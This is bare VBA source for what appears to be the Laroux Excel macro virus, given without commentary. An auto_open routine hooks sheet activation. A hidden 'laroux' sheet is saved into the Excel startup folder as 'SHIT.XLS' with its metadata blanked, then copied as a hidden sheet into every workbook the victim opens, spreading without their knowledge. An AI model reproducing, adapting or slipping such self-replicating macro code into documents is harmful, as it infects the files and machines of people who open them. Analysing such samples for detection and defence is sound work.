Sub auto_open()
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
  c$ = Application.StartupPath
  m$ = Dir(c$ & "\" & "SHIT.XLS")
  If m$ = "SHIT.XLS" Then p = 1 Else p = 0
  If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
  whichfile = p + w * 10
    
  Select Case whichfile
      Case 10
      Application.ScreenUpdating = False
      n4$ = ActiveWorkbook.Name
      Sheets("laroux").Visible = True
      Sheets("laroux").Select
      Sheets("laroux").Copy
      With ActiveWorkbook
          .Title = ""
          .Subject = ""
          .Author = ""
          .Keywords = ""
          .Comments = ""
      End With
      newname$ = ActiveWorkbook.Name
      c4$ = CurDir()
      ChDir Application.StartupPath
      ActiveWindow.Visible = False
      Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "SHIT.XLS", FileFormat:=xlNormal _
          , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
          False, CreateBackup:=False
      ChDir c4$
      Workbooks(n4$).Sheets("laroux").Visible = False
      Application.OnSheetActivate = ""
      Application.ScreenUpdating = True
      Application.OnSheetActivate = "SHIT.xls!check_files"
      Case 1
      Application.ScreenUpdating = False
      n4$ = ActiveWorkbook.Name
      p4$ = ActiveWorkbook.Path
      s$ = Workbooks(n4$).Sheets(1).Name
      If s$ <> "laroux" Then
          Workbooks("SHIT.XLS").Sheets("laroux").Copy before:=Workbooks(n4$).Sheets(1)
          Workbooks(n4$).Sheets("laroux").Visible = False
      Else
      End If
      Application.OnSheetActivate = ""
      Application.ScreenUpdating = True
      Application.OnSheetActivate = "SHIT.xls!check_files"
      Case Else
  End Select
End Sub
